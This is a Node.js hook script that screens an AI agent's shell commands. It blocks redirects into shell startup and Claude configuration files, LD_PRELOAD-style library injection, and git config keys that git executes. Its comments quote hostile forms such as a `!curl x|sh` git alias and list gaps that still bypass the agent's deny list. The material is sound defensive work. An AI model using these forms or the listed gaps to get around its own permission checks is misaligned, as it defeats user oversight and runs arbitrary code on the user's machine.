#!/usr/bin/env node
'use strict';

// protected-write-guard.js — PreToolUse hook (matcher: Bash)
//
// Three unrelated-looking rules that share one property: each is a WRITE to
// something that executes later, expressed in a form the permission engine does
// not recognise as a write at all.
//
//   1. `>` / `>>` redirects into shell startup files, ~/.gitconfig,
//      ~/.claude/settings*.json, ~/.claude/hooks/, ~/Library/LaunchAgents/
//   2. dynamic-linker injection variables (DYLD_INSERT_LIBRARIES, LD_PRELOAD, …)
//   3. `git -c core.fsmonitor=…` and `git -c alias.x=!…`
//
// Why a hook and not deny entries:
//
//   Rule 1 is the documented gap in TASK-026's A2 group. `Edit(~/.zshrc)` denies
//   the Edit tool and the Bash writers the engine recognises, but `echo … >>
//   ~/.zshrc` is not a recognised file-write — it is an `echo`, and the file it
//   lands in is a redirect target the matcher never inspects. The deny list has
//   no vocabulary for "wherever this command's stdout ends up".
//
//   Rule 2 is not a command at all. `DYLD_INSERT_LIBRARIES=/tmp/x.dylib git log`
//   is, to a literal matcher, a `git log` — a read-only command everyone allows.
//   The code that actually runs is a library loaded into the process before
//   main(). Nothing about the spelling of the command reveals it.
//
//   Rule 3 is the sharpest of the three: git executes its OWN config on ordinary
//   commands, so `git -c core.fsmonitor=<cmd> status` is remote code execution
//   that never looks like a fetch and never looks like a write
//   (GHSA-9ccr-r5hg-74gf, TALOS-2025-2243). `Bash(git status:*)` — an entry most
//   people would call obviously safe — matches it.
//
// Matching approach, per rule, and why they differ. Step 4's absolute-path guard
// examines only the FIRST token of a segment; step 2's interpreter guard scans
// EVERY token. Both choices were right for their rule. All three rules here need
// the whole segment, because none of them lives at the start of a command:
//
//   Rule 1 — whole-segment REGEX scan. A redirect operator can appear anywhere,
//     and `>>~/.zshrc` is a single whitespace token while `>> ~/.zshrc` is two,
//     so tokenising first would split the operator from its target in one form
//     and not the other. A regex over the raw segment sees both identically.
//   Rule 2 — whole-segment TOKEN scan. The assignment appears as a bare command
//     prefix, as an argument to `env`, or as an argument to `export`; only a
//     full scan covers all three.
//   Rule 3 — whole-segment TOKEN scan anchored on a `git` token, since `-c` can
//     sit anywhere before the subcommand and `git` itself can be preceded by a
//     wrapper or an env assignment.
//
// Inherited false positive: a segment that merely TALKS ABOUT one of these forms
// can fire, e.g. `echo add it with >> ~/.zshrc`. Accepted — the cost is one
// rephrase, and narrowing it would mean inspecting quoting well enough to
// reimplement the shell. Note the QUOTED spelling `echo "add it with >> ~/.zshrc"`
// does NOT fire: the trailing `"` attaches to the redirect target, which then
// resolves to `~/.zshrc"` and misses the protected list. Both spellings are pinned
// in test/command-class-hooks.test.js — the class is real, but a quoted example is
// not an instance of it.
//
// Known gaps, deliberate:
//   - `tee ~/.zshrc` and `cp x ~/.zshrc` write the same files without a redirect.
//     Out of scope for this hook's checkbox; worth a follow-up.
//   - Redirect targets are resolved lexically, not through realpath(), because
//     the target usually does not exist yet. A pre-existing symlink whose name is
//     unremarkable but which points into ~/.claude/ is not caught.
//   - `git --config-env=alias.x=VAR` reads the value from an environment
//     variable, so the dangerous string never appears in the command. Not covered.
//
// Fails: open — all three rules are pure string/path matching over the command
// itself, with no file read, no subprocess, and no external list, so there is no
// "could not check" state to fail into. If this hook throws anyway,
// lib/command-parse.js catches it and exits 0 and the command is allowed.
// Ambiguous MATCHES go the other way and block — see the inherited false
// positive above.

const path = require('path');
const os = require('os');
const { readHookInput, splitSegments, tokenize, deny } = require('./lib/command-parse');

const HOME = os.homedir();

// Files whose contents are executed or consulted by something other than the
// command that wrote them: shells at startup, git on every invocation, Claude
// Code at session start.
const PROTECTED_FILES = [
  '.zshrc', '.zshenv', '.zprofile',
  '.bashrc', '.bash_profile', '.profile',
  '.gitconfig',
  '.claude/settings.json',
  '.claude/settings.local.json',
].map(rel => path.join(HOME, rel));

// Directories where any file is executable-by-proxy: a hook script runs on the
// next tool call, a LaunchAgent plist runs on the next login.
const PROTECTED_DIRS = [
  path.join(HOME, '.claude', 'hooks'),
  path.join(HOME, 'Library', 'LaunchAgents'),
];

// Redirect operator plus its target, tolerating an fd prefix (`1>>`, `2>`,
// `&>`), zero or more spaces, and a quoted target. The `(?![&>])` lookahead is
// what keeps `2>&1` from being read as a redirect to a file named `&1`.
const REDIRECT = /(?:&|\d+)?>>?(?![&>])\s*("[^"]*"|'[^']*'|[^\s;|&<>()]+)/g;

// Loaded into a process before its own code runs, so the command being approved
// is never the code that executes first.
const INJECTION_VARS = [
  'DYLD_INSERT_LIBRARIES',
  'DYLD_LIBRARY_PATH',
  'LD_PRELOAD',
  'LD_LIBRARY_PATH',
];

// Git config keys that git itself executes as shell commands.
//
// `core.fsmonitor=` with an EMPTY value is the disable form — it is the
// remediation for this vulnerability, not an instance of it — so a non-empty
// value is required. `alias.x=` is only dangerous with a leading `!`, which is
// what promotes an alias from "expands to a git subcommand" to "runs a shell
// command": `git -c alias.foo=status` is ordinary, `git -c alias.foo='!curl x|sh'`
// is not. An optional quote is allowed between `=` and `!` because tokenising
// leaves the opening quote attached to the value.
const GIT_CONFIG_RCE = [
  {
    re: /^core\.fsmonitor=["']?\S/i,
    what: 'core.fsmonitor',
    why: 'git runs the fsmonitor value as a program on ordinary commands such as `git status`',
  },
  {
    re: /^alias\.[^=]+=["']?!/i,
    what: 'a `!`-prefixed git alias',
    why: 'the `!` prefix makes git execute the alias body as a shell command',
  },
];

function unquote(value) {
  const s = String(value);
  if (s.length >= 2 && (s[0] === '"' || s[0] === "'") && s[s.length - 1] === s[0]) {
    return s.slice(1, -1);
  }
  // A token split off a longer quoted string keeps only its opening quote.
  return s.replace(/^["']/, '');
}

function basename(token) {
  const cleaned = token.replace(/^\\+/, '');
  return cleaned.slice(cleaned.lastIndexOf('/') + 1);
}

// `~`, `$HOME`, and `${HOME}` are three spellings of the same directory, and a
// deny rule written against one of them sees none of the others.
function expandHome(target) {
  const s = unquote(target);
  if (s === '~') return HOME;
  if (s.startsWith('~/')) return path.join(HOME, s.slice(2));
  const m = /^(?:\$HOME|\$\{HOME\})(\/.*)?$/.exec(s);
  if (m) return path.join(HOME, m[1] ?? '');
  return s;
}

function isProtectedPath(resolved) {
  if (PROTECTED_FILES.includes(resolved)) return true;
  return PROTECTED_DIRS.some(dir => resolved === dir || resolved.startsWith(dir + path.sep));
}

// Every `-c` config pair in a git invocation, covering both the spaced form
// (`-c key=value`) and the fused form (`-ckey=value`).
function gitConfigPairs(tokens) {
  const pairs = [];
  for (let i = 0; i < tokens.length; i++) {
    if (basename(tokens[i]) !== 'git') continue;
    for (let j = i + 1; j < tokens.length; j++) {
      const t = tokens[j];
      if (t === '-c' && tokens[j + 1] !== undefined) pairs.push(tokens[j + 1]);
      else if (t.length > 2 && t.startsWith('-c')) pairs.push(t.slice(2));
    }
    break;
  }
  return pairs;
}

readHookInput(data => {
  if (data.tool_name !== 'Bash') return;

  const fullCmd = String(data.tool_input?.command ?? '').trim();
  if (!fullCmd) return;

  // Relative redirect targets resolve against the session's directory, not the
  // hook process's — they are different, and `echo x > .zshrc` run from $HOME
  // must be caught.
  const baseDir = typeof data.cwd === 'string' && data.cwd ? data.cwd : process.cwd();

  for (const segment of splitSegments(fullCmd)) {
    // --- Rule 1: redirects into files that execute later ---------------------
    REDIRECT.lastIndex = 0;
    let match;
    while ((match = REDIRECT.exec(segment)) !== null) {
      const resolved = path.resolve(baseDir, expandHome(match[1]));
      if (!isProtectedPath(resolved)) continue; // ordinary redirect — not this hook's business

      deny(
        `Blocked: \`${segment}\` redirects output into \`${resolved}\`, a file that is ` +
        `executed or consulted by something other than this command — a shell at startup, ` +
        `git on every invocation, or Claude Code at session start. ` +
        `The permission deny list covers edits to this path, but a \`>\`/\`>>\` redirect is ` +
        `not a recognised file-write: the rules see an \`${basename(tokenize(segment)[0] ?? '')}\`, ` +
        `not a write, so they never get consulted. ` +
        `If this change is genuinely wanted, make it yourself — a modification to your shell ` +
        `or tool configuration should be a decision you took, not a side effect of a command.`
      );
    }

    const tokens = tokenize(segment);

    // --- Rule 2: dynamic-linker injection ------------------------------------
    for (const token of tokens) {
      const injected = INJECTION_VARS.find(v => token.startsWith(`${v}=`));
      if (!injected) continue;

      deny(
        `Blocked: \`${segment}\` sets \`${injected}\`, which loads code into a process ` +
        `before that process's own code runs. The command as written looks like whatever ` +
        `follows the assignment, so no permission rule can see that something else executes ` +
        `first — an approved \`git log\` becomes an arbitrary payload. ` +
        `There is no safe rewrite of this form; if a library really must be preloaded, do it ` +
        `yourself outside the agent session.`
      );
    }

    // --- Rule 3: git config keys that git executes ---------------------------
    for (const pair of gitConfigPairs(tokens)) {
      const rule = GIT_CONFIG_RCE.find(r => r.re.test(unquote(pair)));
      if (!rule) continue;

      deny(
        `Blocked: \`${segment}\` passes \`${rule.what}\` via \`git -c\`, because ${rule.why}. ` +
        `This is remote code execution that never looks like one: it is not a fetch, not a ` +
        `write, and not a subcommand any deny rule watches — \`Bash(git status:*)\` matches it. ` +
        `See GHSA-9ccr-r5hg-74gf and TALOS-2025-2243. ` +
        `Ordinary config overrides are unaffected (\`git -c user.name=…\`, ` +
        `\`git -c alias.foo=status\`); only values git runs as shell commands are blocked.`
      );
    }
  }
});
